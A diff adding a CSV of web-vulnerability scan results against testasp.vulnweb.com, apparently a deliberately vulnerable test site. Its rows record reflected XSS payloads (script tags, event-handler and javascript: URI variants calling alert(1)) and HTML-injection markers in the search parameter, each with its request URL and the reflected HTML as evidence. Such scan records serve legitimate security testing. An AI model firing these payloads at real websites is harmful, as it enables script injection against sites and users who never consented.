@@ -1,0 +1,39 @@
+scan_id,type,severity,method,vector,param,status,evidence,merged_url,timestamp
+1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
+        <div class='path'>You searched for '<script>alert(1)</script>'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,2025-11-21T19:34:52.694479
+1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
+        <div class='path'>You searched for '<ScRiPt>alert(1)</ScRiPt>'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E,2025-11-21T19:34:52.694479
+1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
+        <div class='path'>You searched for '""><script>alert(1)</script>'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E,2025-11-21T19:34:52.694479
+1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
+        <div class='path'>You searched for '"" onmouseover=""alert(1)""'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%22+onmouseover%3D%22alert%281%29%22,2025-11-21T19:34:52.694479
+1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
+        <div class='path'>You searched for '""><a onmouseover=""alert(1)"">hover</a>'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%22%3E%3Ca+onmouseover%3D%22alert%281%29%22%3Ehover%3C%2Fa%3E,2025-11-21T19:34:52.694479
+1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
+        <div class='path'>You searched for 'javascript:alert(1)//'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=javascript%3Aalert%281%29%2F%2F,2025-11-21T19:34:52.694479
+1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
+        <div class='path'>You searched for '<img src=x onerror=alert(1)>'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,2025-11-21T19:34:52.694479
+1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
+        <div class='path'>You searched for '<svg onload=alert(1)>'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%3Csvg+onload%3Dalert%281%29%3E,2025-11-21T19:34:52.694479
+1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
+        <div class='path'>You searched for '<video src=x onerror=alert(1)>'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cvideo+src%3Dx+onerror%3Dalert%281%29%3E,2025-11-21T19:34:52.694479
+1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
+        <div class='path'>You searched for '"" onfocus=""alert(1)"" autofocus ""'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%22+onfocus%3D%22alert%281%29%22+autofocus+%22,2025-11-21T19:34:52.694479
+1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
+        <div class='path'>You searched for 'javascript:alert(1)'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=javascript%3Aalert%281%29,2025-11-21T19:34:52.694479
+1,xss_reflected,High,GET,form,tfSearch,200,"Payload reflected in dangerous context:     
+        <div class='path'>You searched for '<select autofocus onfocus=alert(1)>'</div><table width=""100%"" cellspacing=""1"" cellpad",http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cselect+autofocus+onfocus%3Dalert%281%29%3E,2025-11-21T19:34:52.694479
+1,html_injection,Medium,GET,form,tfSearch,200,Tag reflected unescaped,http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cb+id%3D%22test-inj%22%3EHTML-INJECTION-TEST%3C%2Fb%3E,2025-11-21T19:34:52.694479
+1,html_injection,Medium,GET,form,tfSearch,200,Tag reflected unescaped,http://testasp.vulnweb.com/Search.asp?tfSearch=%3Ci+class%3D%22test-inj%22%3EHTML-INJECTION-TEST%3C%2Fi%3E,2025-11-21T19:34:52.694479
+1,html_injection,Medium,GET,form,tfSearch,200,Tag reflected unescaped,http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cdiv+style%3D%22background%3Ayellow%3Bcolor%3Ared%3Bpadding%3A10px%22%3EHTML-INJECTION-TEST%3C%2Fdiv%3E,2025-11-21T19:34:52.694479
+1,html_injection,Medium,GET,form,tfSearch,200,Tag reflected unescaped,http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cspan+style%3D%22border%3A2px+solid+red%3Bdisplay%3Ablock%22%3EHTML-INJECTION-TEST%3C%2Fspan%3E,2025-11-21T19:34:52.694479
+1,html_injection,Medium,GET,form,tfSearch,200,Tag reflected unescaped,http://testasp.vulnweb.com/Search.asp?tfSearch=%3Ctable+border%3D1%3E%3Ctr%3E%3Ctd+bgcolor%3Dyellow%3EHTML-INJECTION-TEST%3C%2Ftd%3E%3C%2Ftr%3E%3C%2Ftable%3E,2025-11-21T19:34:52.694479
+1,html_injection,Medium,GET,form,tfSearch,200,Tag reflected unescaped,http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cinput+type%3Dtext+value%3D%22HTML-INJECTION-TEST%22%3E,2025-11-21T19:34:52.694479
+1,html_injection,Medium,GET,form,tfSearch,200,Tag reflected unescaped,http://testasp.vulnweb.com/Search.asp?tfSearch=%3Ctextarea%3EHTML-INJECTION-TEST%3C%2Ftextarea%3E,2025-11-21T19:34:52.694479
+1,html_injection,Medium,GET,form,tfSearch,200,Tag reflected unescaped,http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cul%3E%3Cli+style%3D%22color%3Ared%22%3EHTML-INJECTION-TEST%3C%2Fli%3E%3C%2Ful%3E,2025-11-21T19:34:52.694479
+1,html_injection,Medium,GET,form,tfSearch,200,Tag reflected unescaped,http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cdiv+style%3D%22transform%3Arotate%285deg%29%3Bcolor%3Ared%22%3EHTML-INJECTION-TEST%3C%2Fdiv%3E,2025-11-21T19:34:52.694479
+1,html_injection,Medium,GET,form,tfSearch,200,Tag reflected unescaped,http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cdiv+data-testid%3D%22injection%22%3EHTML-INJECTION-TEST%3C%2Fdiv%3E,2025-11-21T19:34:52.694479
+1,html_injection,Medium,GET,form,tfSearch,200,Tag reflected unescaped,http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cdiv%3E%3Cp%3E%3Cb%3EHTML-INJECTION-TEST%3C%2Fb%3E%3C%2Fp%3E%3C%2Fdiv%3E,2025-11-21T19:34:52.694479
+1,html_injection,Medium,GET,form,tfSearch,200,Tag reflected unescaped,http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cdetails+open%3E%3Csummary%3EHTML-INJECTION-TEST%3C%2Fsummary%3E%3C%2Fdetails%3E,2025-11-21T19:34:52.694479
+1,html_injection,Medium,GET,form,tfSearch,200,Tag reflected unescaped,http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cmarquee%3EHTML-INJECTION-TEST%3C%2Fmarquee%3E,2025-11-21T19:34:52.694479
+1,html_injection,Medium,GET,form,tfSearch,200,Tag reflected unescaped,http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cp+class%3D%22html-injection-test%22%3EHTML-INJECTION-TEST%3C%2Fp%3E,2025-11-21T19:34:52.694479
